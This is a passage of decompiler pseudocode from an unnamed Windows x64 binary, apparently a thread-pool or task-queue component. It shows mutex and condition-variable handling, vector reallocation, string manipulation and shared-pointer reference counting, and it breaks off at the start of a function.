// 140074A50: using guessed type __int64 __fastcall sub_140074A50(_QWORD, _QWORD);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (0000000140074B40) ----------------------------------------------------
__int64 __fastcall sub_140074B40(__int64 a1)
{
  __int64 v1; // rbx
  signed __int64 v2; // rbp
  int v3; // eax
  __int64 v4; // rsi
  __int64 *v5; // rdi
  __int64 *i; // rbx
  int v7; // eax

  v1 = a1;
  v2 = a1 + 64;
  v3 = Mtx_lock(a1 + 64);
  if ( v3 )
    std::_Throw_C_error(v3);
  v4 = 0i64;
  v5 = *(__int64 **)(v1 + 16);
  for ( i = *(__int64 **)(v1 + 8); i != v5; i += 2 )
  {
    if ( (unsigned __int8)sub_140076030(*i) )
      ++v4;
  }
  v7 = Mtx_unlock(v2);
  if ( v7 )
    std::_Throw_C_error(v7);
  return v4;
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (0000000140074BE0) ----------------------------------------------------
char __fastcall sub_140074BE0(__int64 a1)
{
  __int64 *v1; // rbx
  __int64 *v2; // rdi

  v1 = *(__int64 **)(a1 + 8);
  v2 = *(__int64 **)(a1 + 16);
  if ( v1 == v2 )
    return 1;
  while ( (unsigned __int8)sub_140075FD0(*v1) )
  {
    v1 += 2;
    if ( v1 == v2 )
      return 1;
  }
  sub_140076170(*v1);
  return 0;
}

//----- (0000000140074C30) ----------------------------------------------------
unsigned __int64 __fastcall sub_140074C30(__int64 a1)
{
  signed __int64 v1; // rdi
  __int64 v2; // rbx
  int v3; // eax
  unsigned __int64 v4; // rbx
  unsigned __int64 v5; // rbx
  int v6; // eax

  v1 = a1 + 8;
  v2 = a1;
  v3 = Mtx_lock(a1 + 8);
  if ( v3 )
    std::_Throw_C_error(v3);
  v4 = (signed __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(v2 + 24) - *(_QWORD *)(v2 + 16))
                                          * (signed __int128)3074457345618258603i64) >> 64) >> 2;
  v5 = (v4 >> 63) + v4;
  v6 = Mtx_unlock(v1);
  if ( v6 )
    std::_Throw_C_error(v6);
  return v5;
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (0000000140074CA0) ----------------------------------------------------
_BOOL8 __fastcall sub_140074CA0(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // r14
  _QWORD *v7; // rbp
  signed __int64 v8; // r15
  int v9; // eax
  _BYTE *v10; // rbx
  int v11; // eax
  int v12; // eax
  __int64 v13; // rbx
  __int64 v14; // rsi
  __int64 *v15; // rdi
  __int64 *i; // rbx
  int v17; // eax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = (signed __int64)(a1 + 8);
  v9 = Mtx_lock(a1 + 8);
  if ( v9 )
    std::_Throw_C_error(v9);
  v7[6] = v5;
  v7[7] = v4;
  v10 = (_BYTE *)v7[4];
  v11 = Mtx_lock(v10 + 8);
  if ( v11 )
    std::_Throw_C_error(v11);
  *v10 = 1;
  v12 = Mtx_unlock(v10 + 8);
  if ( v12 )
    std::_Throw_C_error(v12);
  if ( v6 )
  {
    v13 = v6;
    do
    {
      sub_140074A50(v7, 0i64);
      --v13;
    }
    while ( v13 );
  }
  v14 = 0i64;
  v15 = (__int64 *)v7[2];
  for ( i = (__int64 *)v7[1]; i != v15; i += 2 )
  {
    if ( (unsigned __int8)sub_140076030(*i) )
      ++v14;
  }
  v17 = Mtx_unlock(v8);
  if ( v17 )
    std::_Throw_C_error(v17);
  return v14 == v6;
}
// 140074A50: using guessed type __int64 __fastcall sub_140074A50(_QWORD, _QWORD);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (0000000140074DB0) ----------------------------------------------------
__int64 __fastcall sub_140074DB0(__int64 a1)
{
  __int64 v1; // rsi
  _BYTE *v2; // rbx
  int v3; // eax
  int v4; // eax
  int v5; // eax
  signed __int64 v6; // r14
  int v7; // eax
  unsigned __int8 v8; // bp
  __int64 *v9; // rdi
  __int64 *i; // rbx
  __int64 *v11; // rdi
  __int64 *j; // rbx
  __int64 v13; // r15
  __int64 v14; // rdi
  volatile signed __int32 *v15; // rbx
  int v16; // eax

  v1 = a1;
  v2 = *(_BYTE **)(a1 + 32);
  v3 = Mtx_lock(v2 + 8);
  if ( v3 )
    std::_Throw_C_error(v3);
  *v2 = 0;
  v4 = Cnd_broadcast(v2 + 48);
  if ( v4 )
    std::_Throw_C_error(v4);
  v5 = Mtx_unlock(v2 + 8);
  if ( v5 )
    std::_Throw_C_error(v5);
  v6 = v1 + 64;
  v7 = Mtx_lock(v1 + 64);
  if ( v7 )
    std::_Throw_C_error(v7);
  v8 = 1;
  v9 = *(__int64 **)(v1 + 16);
  for ( i = *(__int64 **)(v1 + 8); i != v9; i += 2 )
    v8 &= sub_140076260(*i);
  v11 = *(__int64 **)(v1 + 16);
  for ( j = *(__int64 **)(v1 + 8); j != v11; j += 2 )
    sub_1400760E0(*j);
  v13 = *(_QWORD *)(v1 + 16);
  v14 = *(_QWORD *)(v1 + 8);
  if ( v14 != v13 )
  {
    do
    {
      v15 = *(volatile signed __int32 **)(v14 + 8);
      if ( v15 )
      {
        if ( !_InterlockedDecrement(v15 + 2) )
        {
          (**(void (__fastcall ***)(volatile signed __int32 *))v15)(v15);
          if ( !_InterlockedDecrement(v15 + 3) )
            (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v15 + 8i64))(v15);
        }
      }
      v14 += 16i64;
    }
    while ( v14 != v13 );
    v6 = v1 + 64;
  }
  *(_QWORD *)(v1 + 16) = *(_QWORD *)(v1 + 8);
  v16 = Mtx_unlock(v6);
  if ( v16 )
    std::_Throw_C_error(v16);
  return v8;
}
// 1400A1490: using guessed type __int64 __fastcall Cnd_broadcast(_QWORD);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);

//----- (0000000140074F20) ----------------------------------------------------
void __fastcall sub_140074F20(__int64 a1)
{
  __int64 v1; // rbx
  volatile signed __int32 **v2; // rdx

  v1 = *(_QWORD *)(a1 + 16);
  if ( v1 )
  {
    Cnd_destroy(v1 + 48);
    v2 = *(volatile signed __int32 ***)(v1 + 16);
    if ( v2 )
    {
      sub_140074FC0(v1 + 16, v2, *(volatile signed __int32 ***)(v1 + 24));
      operator delete(*(void **)(v1 + 16));
      *(_QWORD *)(v1 + 16) = 0i64;
      *(_QWORD *)(v1 + 24) = 0i64;
      *(_QWORD *)(v1 + 32) = 0i64;
    }
    _Mtx_destroy(v1 + 8);
    operator delete((void *)v1);
  }
}
// 1400A1498: using guessed type __int64 __fastcall Cnd_destroy(_QWORD);
// 1400A1628: using guessed type __int64 __fastcall _Mtx_destroy(_QWORD);

//----- (0000000140074F90) ----------------------------------------------------
void __fastcall sub_140074F90(__int64 a1)
{
  void *v1; // rbx

  v1 = *(void **)(a1 + 16);
  if ( v1 )
  {
    sub_140075F30(*(_QWORD *)(a1 + 16));
    operator delete(v1);
  }
}

//----- (0000000140074FC0) ----------------------------------------------------
signed __int64 __fastcall sub_140074FC0(__int64 a1, volatile signed __int32 **a2, volatile signed __int32 **a3)
{
  volatile signed __int32 **v3; // rsi
  volatile signed __int32 **v4; // rdi
  volatile signed __int32 *v5; // rbx
  signed __int64 result; // rax

  if ( a2 != a3 )
  {
    v3 = a3;
    v4 = a2 + 2;
    do
    {
      v5 = *v4;
      if ( *v4 && !_InterlockedDecrement(v5 + 2) )
      {
        (**(void (__fastcall ***)(volatile signed __int32 *))v5)(v5);
        if ( !_InterlockedDecrement(v5 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v5 + 8i64))(v5);
      }
      v4 += 3;
      result = (signed __int64)(v4 - 2);
    }
    while ( v4 - 2 != v3 );
  }
  return result;
}

//----- (0000000140075030) ----------------------------------------------------
signed __int64 __fastcall sub_140075030(void **a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rdi
  void **v3; // rsi
  _QWORD *v4; // rbx
  unsigned __int64 v5; // rdx
  unsigned __int64 v6; // r14
  signed __int64 result; // rax

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0xAAAAAAAAAAAAAAAi64 || (v4 = operator new(24 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  sub_1400742B0(*v3, v3[1], v4);
  v5 = (unsigned __int128)(((_BYTE *)v3[1] - (_BYTE *)*v3) * (signed __int128)3074457345618258603i64) >> 64;
  v6 = (v5 >> 63) + ((signed __int64)v5 >> 2);
  if ( *v3 )
  {
    sub_140074FC0((__int64)v3, (volatile signed __int32 **)*v3, (volatile signed __int32 **)v3[1]);
    operator delete(*v3);
  }
  v3[2] = &v4[3 * v2];
  result = 3 * v6;
  v3[1] = &v4[3 * v6];
  *v3 = v4;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140075120) ----------------------------------------------------
void __fastcall sub_140075120(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rbx
  __int64 v3; // r14
  __int64 *v4; // rsi
  __int64 v5; // rdi

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  if ( a2 )
  {
    if ( a2 > 0xFFFFFFFFFFFFFFFi64 || (v4 = (__int64 *)operator new(16 * a2)) == 0i64 )
      std::_Xbad_alloc();
  }
  sub_140074370(*(__int64 **)v3, *(__int64 **)(v3 + 8), v4);
  v5 = *(_QWORD *)(v3 + 8) - *(_QWORD *)v3;
  if ( *(_QWORD *)v3 )
  {
    sub_140029680(v3, *(volatile signed __int32 ***)v3, *(volatile signed __int32 ***)(v3 + 8));
    operator delete(*(void **)v3);
  }
  *(_QWORD *)(v3 + 16) = &v4[2 * v2];
  *(_QWORD *)(v3 + 8) = (char *)v4 + (v5 & 0xFFFFFFFFFFFFFFF0ui64);
  *(_QWORD *)v3 = v4;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (00000001400751F0) ----------------------------------------------------
__int64 __fastcall sub_1400751F0(void **a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // r9
  void **v3; // rbx
  _BYTE *v4; // rcx
  signed __int128 v5; // ax
  unsigned __int64 v6; // rdx
  unsigned __int64 v7; // rax

  v2 = a2;
  v3 = a1;
  v4 = a1[1];
  v5 = ((_BYTE *)v3[2] - v4) * (signed __int128)3074457345618258603i64;
  if ( (*((_QWORD *)&v5 + 1) >> 63) + (*((_QWORD *)&v5 + 1) >> 2) < v2 )
  {
    v6 = ((unsigned __int64)((unsigned __int128)((v4 - (_BYTE *)*v3) * (signed __int128)3074457345618258603i64) >> 64) >> 63)
       + ((signed __int64)((unsigned __int128)((v4 - (_BYTE *)*v3) * (signed __int128)3074457345618258603i64) >> 64) >> 2);
    if ( 768614336404564650i64 - v6 < v2 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v7 = sub_140095AD0(v3, v2 + v6);
    *(_QWORD *)&v5 = sub_140075030(v3, v7);
  }
  return v5;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140075290) ----------------------------------------------------
void __fastcall sub_140075290(_QWORD *a1, unsigned __int64 a2)
{
  __int64 v2; // r8
  unsigned __int64 v3; // r9
  __int64 v4; // rdx
  signed __int64 v5; // r10
  __int64 v6; // r8
  unsigned __int64 v7; // r11
  unsigned __int64 v8; // rdx
  unsigned __int64 v9; // rdx
  unsigned __int64 v10; // rdx

  v2 = a1[1];
  v3 = a2;
  v4 = a1[2];
  if ( (a1[2] - v2) >> 4 < v3 )
  {
    v5 = 0xFFFFFFFFFFFFFFFi64;
    v6 = (v2 - *a1) >> 4;
    if ( 0xFFFFFFFFFFFFFFFi64 - v6 < v3 )
    {
      std::_Xlength_error("vector<T> too long");
      __debugbreak();
    }
    v7 = v6 + v3;
    v8 = (v4 - *a1) >> 4;
    if ( v5 - (v8 >> 1) >= v8 )
    {
      v10 = (v8 >> 1) + v8;
      if ( v10 < v7 )
        v10 = v6 + v3;
      sub_140075120((__int64)a1, v10);
    }
    else
    {
      v9 = 0i64;
      if ( v7 > 0 )
        v9 = v6 + v3;
      sub_140075120((__int64)a1, v9);
    }
  }
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (0000000140075320) ----------------------------------------------------
void __fastcall sub_140075320(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rdi
  __int64 v3; // rbx
  unsigned __int64 v4; // rcx
  unsigned __int64 v5; // rdi
  unsigned __int64 v6; // rdi
  _QWORD *v7; // rdx
  _QWORD *v8; // rcx
  _QWORD *v9; // rcx
  __int64 v10; // r8
  __int64 v11; // rdx
  _QWORD *v12; // rcx
  _QWORD *v13; // rcx
  __int64 v14; // r8
  __int64 v15; // rdx

  v2 = a2;
  v3 = a1;
  v4 = *(_QWORD *)(a1 + 8);
  if ( (unsigned __int64)a2 >= v4 || *(_QWORD *)v3 > (unsigned __int64)a2 )
  {
    if ( v4 == *(_QWORD *)(v3 + 16) )
      sub_1400751F0((void **)v3, 1ui64);
    v12 = *(_QWORD **)(v3 + 8);
    if ( v12 )
    {
      *v12 = *v2;
      v13 = v12 + 1;
      *v13 = 0i64;
      v13[1] = 0i64;
      v14 = v2[2];
      v15 = v2[1];
      if ( v14 )
        _InterlockedIncrement((volatile signed __int32 *)(v14 + 8));
      sub_140029830(v13, v15, v14);
    }
  }
  else
  {
    v5 = (signed __int64)((unsigned __int128)(((signed __int64)a2 - *(_QWORD *)v3)
                                            * (signed __int128)3074457345618258603i64) >> 64) >> 2;
    v6 = (v5 >> 63) + v5;
    if ( v4 == *(_QWORD *)(v3 + 16) )
      sub_1400751F0((void **)v3, 1ui64);
    v7 = (_QWORD *)(*(_QWORD *)v3 + 24 * v6);
    v8 = *(_QWORD **)(v3 + 8);
    if ( v8 )
    {
      *v8 = *v7;
      v9 = v8 + 1;
      *v9 = 0i64;
      v9[1] = 0i64;
      v10 = v7[2];
      v11 = v7[1];
      if ( v10 )
        _InterlockedIncrement((volatile signed __int32 *)(v10 + 8));
      sub_140029830(v9, v11, v10);
    }
  }
  *(_QWORD *)(v3 + 8) += 24i64;
}

//----- (0000000140075500) ----------------------------------------------------
_QWORD *__fastcall sub_140075500(void *Dst, _DWORD *(__fastcall *a2)(void *Src))
{
  _QWORD *v2; // rbx
  void **v3; // rax
  void **v4; // rdi
  void **v5; // r8
  char *v6; // r8
  char *v7; // rdx
  unsigned __int64 v8; // rcx
  void **Dsta; // [rsp+40h] [rbp-29h]
  size_t v11; // [rsp+50h] [rbp-19h]
  unsigned __int64 v12; // [rsp+58h] [rbp-11h]
  __int64 Src; // [rsp+60h] [rbp-9h]
  __int64 v14; // [rsp+70h] [rbp+7h]
  unsigned __int64 v15; // [rsp+78h] [rbp+Fh]
  void *v16; // [rsp+80h] [rbp+17h]
  __int64 v17; // [rsp+90h] [rbp+27h]
  unsigned __int64 v18; // [rsp+98h] [rbp+2Fh]

  v2 = Dst;
  if ( a2 )
  {
    v3 = (void **)a2(&v16);
    v4 = v3;
    v12 = 15i64;
    v11 = 0i64;
    LOBYTE(Dsta) = 0;
    if ( (unsigned __int64)v3[3] >= 0x10 )
    {
      Dsta = (void **)*v3;
      *v3 = 0i64;
    }
    else if ( v3[2] != (void *)-1i64 )
    {
      memmove(&Dsta, v3, (size_t)v3[2] + 1);
    }
    v11 = (size_t)v4[2];
    v12 = (unsigned __int64)v4[3];
    v4[3] = (void *)15;
    v4[2] = 0i64;
    *(_BYTE *)v4 = 0;
    if ( v18 >= 0x10 )
      operator delete(v16);
    v18 = 15i64;
    v17 = 0i64;
    LOBYTE(v16) = 0;
    v5 = (void **)&Dsta;
    if ( v12 >= 0x10 )
      v5 = Dsta;
    v6 = (char *)v5 + v11;
    v7 = (char *)&Dsta;
    if ( v12 >= 0x10 )
      v7 = (char *)Dsta;
    v15 = 7i64;
    v14 = 0i64;
    LOWORD(Src) = 0;
    sub_1400161F0(&Src, v7, v6);
    sub_1400756C0(&Dsta, 0i64, v11, v11, 42);
    v2[3] = 7i64;
    v2[2] = 0i64;
    *(_WORD *)v2 = 0;
    v8 = v15;
    if ( v15 >= 8 )
    {
      *v2 = Src;
      Src = 0i64;
    }
    else if ( v14 != -1 )
    {
      memmove(v2, &Src, 2 * (v14 + 1));
      v8 = v15;
    }
    v2[2] = v14;
    v2[3] = v8;
    v15 = 7i64;
    v14 = 0i64;
    LOWORD(Src) = 0;
    if ( v12 >= 0x10 )
      operator delete(Dsta);
  }
  else
  {
    *((_QWORD *)Dst + 3) = 7i64;
    *((_QWORD *)Dst + 2) = 0i64;
    *(_WORD *)Dst = 0;
  }
  return v2;
}

//----- (00000001400756C0) ----------------------------------------------------
_QWORD *__usercall sub_1400756C0@<rax>(void *Src@<rcx>, unsigned __int64 a2@<rdx>, size_t a3@<r8>, size_t a4@<r9>, char a5)
{
  _QWORD *v5; // rbx
  unsigned __int64 v6; // rcx
  size_t v7; // rbp
  size_t v8; // rsi
  unsigned __int64 v9; // r15
  __int64 v10; // r14
  size_t v11; // r14
  unsigned __int64 v12; // rax
  _QWORD *v13; // rcx
  _QWORD *v14; // rax
  size_t v15; // r8
  unsigned __int64 v16; // rdi
  unsigned __int64 v17; // rax
  unsigned __int64 v18; // rax
  _QWORD *v19; // rcx
  _QWORD *v20; // rax
  _QWORD *v21; // rax
  bool v22; // cf
  _QWORD *v23; // rax

  v5 = Src;
  v6 = *((_QWORD *)Src + 2);
  v7 = a4;
  v8 = a3;
  v9 = a2;
  if ( v6 < a2 )
  {
    std::_Xout_of_range("invalid string position");
    __debugbreak();
  }
  v10 = v6 - a2;
  if ( v6 - a2 < a3 )
    v8 = v6 - a2;
  if ( -1i64 - a4 <= v6 - v8 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v11 = v10 - v8;
  if ( a4 < v8 )
  {
    v12 = v5[3];
    v13 = v12 < 0x10 ? v5 : *v5;
    v14 = v12 < 0x10 ? v5 : *v5;
    if ( v11 )
      memmove((char *)v14 + v9 + a4, (char *)v13 + a2 + v8, v11);
  }
  if ( v7 || v8 )
  {
    v15 = v5[2];
    v16 = v7 + v5[2] - v8;
    if ( v16 > 0xFFFFFFFFFFFFFFFEui64 )
    {
      std::_Xlength_error("string too long");
      __debugbreak();
    }
    v17 = v5[3];
    if ( v17 >= v16 )
    {
      if ( !v16 )
      {
        v5[2] = 0i64;
        if ( v17 < 0x10 )
          *(_BYTE *)v5 = 0;
        else
          *(_BYTE *)*v5 = 0;
        return v5;
      }
    }
    else
    {
      sub_140004790(v5, v16, v15);
      if ( !v16 )
        return v5;
    }
    if ( v8 < v7 )
    {
      v18 = v5[3];
      v19 = v18 < 0x10 ? v5 : *v5;
      v20 = v18 < 0x10 ? v5 : *v5;
      if ( v11 )
        memmove((char *)v20 + v9 + v7, (char *)v19 + v9 + v8, v11);
    }
    if ( v7 == 1 )
    {
      if ( v5[3] < 0x10ui64 )
        *((_BYTE *)v5 + v9) = a5;
      else
        *(_BYTE *)(*v5 + v9) = a5;
    }
    else
    {
      if ( v5[3] < 0x10ui64 )
        v21 = v5;
      else
        v21 = (_QWORD *)*v5;
      memset((char *)v21 + v9, a5, v7);
    }
    v22 = v5[3] < 0x10ui64;
    v5[2] = v16;
    if ( v22 )
      v23 = v5;
    else
      v23 = (_QWORD *)*v5;
    *((_BYTE *)v23 + v16) = 0;
  }
  return v5;
}
// 1400A1768: using guessed type void __stdcall std::_Xout_of_range(const char *);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (00000001400758A0) ----------------------------------------------------
__int64 __fastcall sub_1400758A0(__int64 a1, _QWORD *a2, __int64 a3)
{
  _QWORD *v3; // rbp
  __int64 v4; // rdi
  signed __int64 v5; // rsi
  int v6; // eax
  signed __int64 v7; // rcx
  int v8; // eax
  int v9; // ebx
  int v10; // eax
  _QWORD *v11; // rcx
  __int64 v12; // r8
  unsigned __int8 v13; // bl
  int v14; // eax
  __m128i v16; // [rsp+20h] [rbp-88h]
  __int128 v17; // [rsp+50h] [rbp-58h]
  __int64 v18; // [rsp+C0h] [rbp+18h]

  v18 = a3;
  v3 = a2;
  v4 = a1;
  v5 = a1 + 8;
  v6 = Mtx_lock(a1 + 8);
  if ( v6 )
    std::_Throw_C_error(v6);
  if ( *(_BYTE *)v4 )
  {
    while ( *(_QWORD *)(v4 + 16) == *(_QWORD *)(v4 + 24) )
    {
      if ( 1000000000 * v18 )
      {
        if ( v18 > 0 )
        {
          v7 = 1000000000 * v18 + 100 * Xtime_get_ticks();
          v16.m128i_i64[0] = ((unsigned __int64)((unsigned __int128)(v7 * (signed __int128)1237940039285380275i64) >> 64) >> 63)
                           + ((signed __int64)((unsigned __int128)(v7 * (signed __int128)1237940039285380275i64) >> 64) >> 26);
          v16.m128i_i32[2] = v7 - 1000000000 * v16.m128i_i32[0];
        }
        else
        {
          v16.m128i_i64[0] = 0i64;
          v16.m128i_i32[2] = 0;
        }
        _mm_store_si128((__m128i *)&v17, v16);
        if ( !(unsigned int)Mtx_current_owns(v5) )
          std::_Throw_Cpp_error(4);
        v8 = Cnd_timedwait(v4 + 48, v5, &v17);
        v9 = v8;
        if ( v8 & 0xFFFFFFFD )
          std::_Throw_C_error(v8);
        if ( v9 == 2 )
          goto LABEL_22;
      }
      else
      {
        v10 = Cnd_wait(v4 + 48, v5);
        if ( v10 )
          std::_Throw_C_error(v10);
      }
      if ( !*(_BYTE *)v4 )
        goto LABEL_22;
    }
    sub_140074710(v3, (__int64 *)(*(_QWORD *)(v4 + 16) + 8i64));
    v11 = *(_QWORD **)(v4 + 16);
    if ( (signed __int64)(((unsigned __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(v4 + 24) - (_QWORD)v11)
                                                                * (signed __int128)3074457345618258603i64) >> 64) >> 63)
                        + ((signed __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(v4 + 24) - (_QWORD)v11)
                                                              * (signed __int128)3074457345618258603i64) >> 64) >> 2)) > 1 )
    {
      v12 = *(unsigned __int8 *)(v4 + 40);
      sub_140075DD0(v11, *(_QWORD *)(v4 + 24));
    }
    sub_1400763F0(v4 + 16);
    v13 = 1;
  }
  else
  {
LABEL_22:
    v13 = 0;
  }
  v14 = Mtx_unlock(v5);
  if ( v14 )
    std::_Throw_C_error(v14);
  return v13;
}
// 1400A1478: using guessed type __int64 __fastcall Cnd_timedwait(_QWORD, _QWORD, _QWORD);
// 1400A1480: using guessed type __int64 __fastcall Cnd_wait(_QWORD, _QWORD);
// 1400A1488: using guessed type __int64 __fastcall Mtx_current_owns(_QWORD);
// 1400A14B0: using guessed type __int64 Xtime_get_ticks(void);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);
// 1400A1730: using guessed type void __stdcall std::_Throw_Cpp_error(_DWORD);

//----- (0000000140075A80) ----------------------------------------------------
__int64 __fastcall sub_140075A80(__int64 a1, _QWORD *a2, __int64 a3)
{
  _QWORD *v3; // rbp
  __int64 v4; // rdi
  signed __int64 v5; // rsi
  int v6; // eax
  __int64 v7; // rcx
  int v8; // eax
  int v9; // ebx
  int v10; // eax
  _QWORD *v11; // rcx
  __int64 v12; // r8
  unsigned __int8 v13; // bl
  int v14; // eax
  __m128i v16; // [rsp+20h] [rbp-88h]
  __int128 v17; // [rsp+50h] [rbp-58h]
  __int64 v18; // [rsp+C0h] [rbp+18h]

  v18 = a3;
  v3 = a2;
  v4 = a1;
  v5 = a1 + 8;
  v6 = Mtx_lock(a1 + 8);
  if ( v6 )
    std::_Throw_C_error(v6);
  if ( *(_BYTE *)v4 )
  {
    while ( *(_QWORD *)(v4 + 16) == *(_QWORD *)(v4 + 24) )
    {
      if ( v18 )
      {
        if ( v18 > 0 )
        {
          v7 = v18 + 100 * Xtime_get_ticks();
          v16.m128i_i64[0] = ((unsigned __int64)((unsigned __int128)(v7 * (signed __int128)1237940039285380275i64) >> 64) >> 63)
                           + ((signed __int64)((unsigned __int128)(v7 * (signed __int128)1237940039285380275i64) >> 64) >> 26);
          v16.m128i_i32[2] = v7 - 1000000000 * v16.m128i_i32[0];
        }
        else
        {
          v16.m128i_i64[0] = 0i64;
          v16.m128i_i32[2] = 0;
        }
        _mm_store_si128((__m128i *)&v17, v16);
        if ( !(unsigned int)Mtx_current_owns(v5) )
          std::_Throw_Cpp_error(4);
        v8 = Cnd_timedwait(v4 + 48, v5, &v17);
        v9 = v8;
        if ( v8 & 0xFFFFFFFD )
          std::_Throw_C_error(v8);
        if ( v9 == 2 )
          goto LABEL_22;
      }
      else
      {
        v10 = Cnd_wait(v4 + 48, v5);
        if ( v10 )
          std::_Throw_C_error(v10);
      }
      if ( !*(_BYTE *)v4 )
        goto LABEL_22;
    }
    sub_140074710(v3, (__int64 *)(*(_QWORD *)(v4 + 16) + 8i64));
    v11 = *(_QWORD **)(v4 + 16);
    if ( (signed __int64)(((unsigned __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(v4 + 24) - (_QWORD)v11)
                                                                * (signed __int128)3074457345618258603i64) >> 64) >> 63)
                        + ((signed __int64)((unsigned __int128)((signed __int64)(*(_QWORD *)(v4 + 24) - (_QWORD)v11)
                                                              * (signed __int128)3074457345618258603i64) >> 64) >> 2)) > 1 )
    {
      v12 = *(unsigned __int8 *)(v4 + 40);
      sub_140075DD0(v11, *(_QWORD *)(v4 + 24));
    }
    sub_1400763F0(v4 + 16);
    v13 = 1;
  }
  else
  {
LABEL_22:
    v13 = 0;
  }
  v14 = Mtx_unlock(v5);
  if ( v14 )
    std::_Throw_C_error(v14);
  return v13;
}
// 1400A1478: using guessed type __int64 __fastcall Cnd_timedwait(_QWORD, _QWORD, _QWORD);
// 1400A1480: using guessed type __int64 __fastcall Cnd_wait(_QWORD, _QWORD);
// 1400A1488: using guessed type __int64 __fastcall Mtx_current_owns(_QWORD);
// 1400A14B0: using guessed type __int64 Xtime_get_ticks(void);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);
// 1400A1730: using guessed type void __stdcall std::_Throw_Cpp_error(_DWORD);

//----- (0000000140075C60) ----------------------------------------------------
__int64 __fastcall sub_140075C60(__int64 a1, signed __int64 a2, signed __int64 a3, _QWORD *a4)
{
  signed __int64 v4; // rbx
  _QWORD *v5; // rbp
  signed __int64 v6; // r15
  __int64 v7; // r14
  signed __int64 i; // r12
  _QWORD *v9; // rcx
  _QWORD *v10; // rdx
  __int64 v11; // rax
  __int64 v12; // r8
  volatile signed __int32 *v13; // rcx
  signed __int64 v14; // rcx
  _QWORD *v15; // rdx
  __int64 v16; // rax
  __int64 v17; // r8
  volatile signed __int32 *v18; // rcx
  volatile signed __int32 *v20; // [rsp+38h] [rbp-30h]
  volatile signed __int32 *v21; // [rsp+48h] [rbp-20h]

  v4 = 2 * a2 + 2;
  v5 = a4;
  v6 = a3;
  v7 = a1;
  for ( i = a2; v4 < v6; v4 = 2 * v4 + 2 )
  {
    if ( *(_QWORD *)(v7 + 24 * v4) < *(_QWORD *)(v7 + 24 * v4 - 24) )
      --v4;
    v9 = (_QWORD *)(v7 + 24 * v4);
    v10 = (_QWORD *)(v7 + 24 * a2);
    *v10 = *v9;
    v11 = v9[2];
    v12 = v9[1];
    if ( v11 )
      _InterlockedIncrement((volatile signed __int32 *)(v11 + 8));
    v13 = (volatile signed __int32 *)v10[2];
    v10[2] = v11;
    v10[1] = v12;
    v20 = v13;
    if ( v13 )
    {
      if ( !_InterlockedDecrement(v13 + 2) )
      {
        (**(void (__fastcall ***)(volatile signed __int32 *))v13)(v13);
        if ( !_InterlockedDecrement(v20 + 3) )
          (*(void (**)(void))(*(_QWORD *)v20 + 8i64))();
      }
    }
    a2 = v4;
  }
  if ( v4 == v6 )
  {
    v14 = v7 + 24 * v6;
    v15 = (_QWORD *)(v7 + 24 * a2);
    *v15 = *(_QWORD *)(v14 - 24);
    v16 = *(_QWORD *)(v14 - 8);
    v17 = *(_QWORD *)(v14 - 16);
    if ( v16 )
      _InterlockedIncrement((volatile signed __int32 *)(v16 + 8));
    v18 = (volatile signed __int32 *)v15[2];
    v15[2] = v16;
    v15[1] = v17;
    v21 = v18;
    if ( v18 )
    {
      if ( !_InterlockedDecrement(v18 + 2) )
      {
        (**(void (__fastcall ***)(volatile signed __int32 *))v18)(v18);
        if ( !_InterlockedDecrement(v21 + 3) )
          (*(void (**)(void))(*(_QWORD *)v21 + 8i64))();
      }
    }
    a2 = v6 - 1;
  }
  return sub_140073FC0(v7, a2, i, v5);
}

//----- (0000000140075DD0) ----------------------------------------------------
__int64 __fastcall sub_140075DD0(_QWORD *a1, __int64 a2)
